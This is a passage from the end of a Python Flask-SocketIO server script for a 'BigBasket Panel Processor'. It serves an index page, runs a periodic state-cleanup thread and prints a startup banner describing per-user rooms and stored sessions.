        leave_room(user_id)

# ============================================================
# HTML INDEX
# ============================================================
@app.route('/index.html')
def serve_index():
    return send_from_directory('.', 'index.html')

# ============================================================
# MAIN
# ============================================================
if __name__ == '__main__':
    # Clean up old states periodically
    import threading
    def cleanup_thread():
        while True:
            time.sleep(300)  # Every 5 minutes
            cleanup_old_states()
    
    cleanup = threading.Thread(target=cleanup_thread, daemon=True)
    cleanup.start()
    
    port = int(os.environ.get('PORT', 5000))
    print("="*60)
    print("  BigBasket Panel Processor - User Isolated")
    print("="*60)
    print(f"\n  ✅ Each user has their own private room")
    print(f"  ✅ Different logs for different IPs")
    print(f"  ✅ Sessions stored per user")
    print(f"  Workers per panel: {CONCURRENT_WORKERS}")
    print(f"\n  💾 Sessions saved in: {BASE_SESSIONS_DIR}/")
    print(f"\n  🌐 Server running on port {port}")
    print("  Press Ctrl+C to stop\n")
    print("  📊 Active users: /api/users")
    print("="*60)
    
    socketio.run(app, host='0.0.0.0', port=port, debug=False)